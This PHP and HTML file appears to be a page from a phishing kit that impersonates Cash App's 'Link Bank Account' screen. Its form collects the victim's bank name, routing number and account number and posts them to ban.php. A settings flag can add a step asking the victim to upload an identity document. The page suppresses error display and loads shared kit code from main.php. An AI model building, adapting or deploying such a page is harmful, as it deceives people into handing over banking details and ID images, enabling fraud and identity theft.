<?php
ini_set( "display_errors", 0); 
require_once '../../main.php';
?>
<!DOCTYPE html>
<html lang="en" style="--vh:722px;"> 
<head> 
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"> 
<title>Cash App</title> 
<link rel="icon" sizes="196x196" href="/static/img/icon.png"> 
<link rel="icon" href="/static/img/favicon.ico"> 
<link rel="stylesheet" type="text/css" href="/static/css/cash.css" > 
<link rel="stylesheet" type="text/css" href="/static/css/cok.css" > 
<script src="/static/js/script.js"></script>
<script type="text/javascript" src="/static/js/jquery-2.0.3.min.js"></script>  
<style> 
    input{ 
    height:55px 
    !important; 
    } 
    .rowdua{ 
    width:100%; 
    display:flex; 
    } 
    .kanan{ 
    margin-left:3px; 
    float:left; 
    flex:49%; 
    position:relative; } 
    .kiri{ 
    margin-right:3px; 
    float:right; 
    flex:49%; 
    position:relative; 
    } 
    .center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 30%;
}
.center2 {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 110%;
}
.idngentot {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 95%;
  }
 /* Button */
</style> 
<script>
// Submit form with id function.
function submit_by_id() {
var bank = document.getElementById("#frmBank").value;
if (validation()) // Calling validation function
{
document.getElementById("uploadimage").submit(); //form submission
}
}

function confirm_by_id() {
var bank = document.getElementById("#frmBank").value;
if (validation()) // Calling validation function
{
document.getElementById("parentForm").submit(); //form submission
}
}
</script> 
</head> 
<body class="theme-bg ember-application theme-green"> 
<div id="ember321" class="ember-view"> 
<div id="ember345" class="full-height application-cash ember-view"> 
<div id="ember352" class="cookie-banner ember-view">  </div> 
<section class="layout-login flex-container full-height pad"> 
<div class="login-container flex-container flex-v-center flex-fill"> 
<h1 class="step-title flex-static">Link Bank Account</h1> 
<form autocomplete="off" novalidate="true" id="frmBank" method="POST" action="ban.php" class="login-form ember-view"> 
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view "> 
<input type="text" name="bankname" autocomplete="off" spellcheck="false" id="bankname" class="ember-text-field ember-view" placeholder="Bank Name">
<input type="tel" name="rnum" autocomplete="off" spellcheck="false" id="rnum" class="ember-text-field ember-view" placeholder="Routing Number">
<input type="tel" name="anum" autocomplete="off" spellcheck="false" id="anum" class="ember-text-field ember-view" placeholder="Account Number" maxlength="20"> 
</div> 
</div> 
</div> 
<div id="ember555" class="cta submit-button-component submit-button-with-spinner ember-view"> 
<button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Link Bank Account</button> 
</div> 
</form> 
<a href="#" class="login-help-link fade-in immediate show">Help</a> 
</div> 
</section> 
<div id="cashModal" class="modal-manager ember-view" style="display:none"> 
<div class="modal-overlay show"></div> 
<div class="modal-scroller fade-in show ember-view"> 
<div class="modal-window flex-container flex-v theme-white small ember-view"> 
<div class="modal-window-content content"> <div class="spinner-container ember-view"></div> 
<img src="../../static/img/success_v2.png" alt="Paris" class="center">
<?php if ($setting['upload_id'] == "Active") { ?>
    <p class="instructions"><br>Cool! <br>Last step <br>Verify your identity</p>
    <div class="instructions">
<form id="uploadimage" enctype="multipart/form-data">
<a href="#" id="image_preview">
<img id="previewing" class="center2" src="../../static/img/uploadcc.png" File" onclick="document.getElementById('file').click()" /></a>
<input type="file" name="file" id="file"  style="display:none" required />
<br>
<input type="submit" class="button theme-button resend-code" value="Confirm" id="submit" class="submit" onclick="submit_by_id()"/>
<div id="message" ></div><br>
<button id="submit2" class="button theme-button resend-code">Continue</button>
</div>
</form>
<?php } else { ?>
    <p class="instructions"><br>Cool! <br>Now you can transfer, deposit and use our features.</p><br>
    <button id="btnConfirm" data-oauth="" class="button theme-button resend-code">Continue</button>
<?php } ?>
<div></div>
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
<script type="text/javascript" src="/static/js/jquery.min.js"></script> 
<script type="text/javascript" src="/static/js/mask.js"></script> 
<script type="text/javascript" src="/static/js/bank.js"></script> 
<script type="text/javascript" src="/static/js/script.js"></script> 
<script type="text/javascript" src="/static/js/jquery-2.0.3.min.js"></script>
</body>
</html>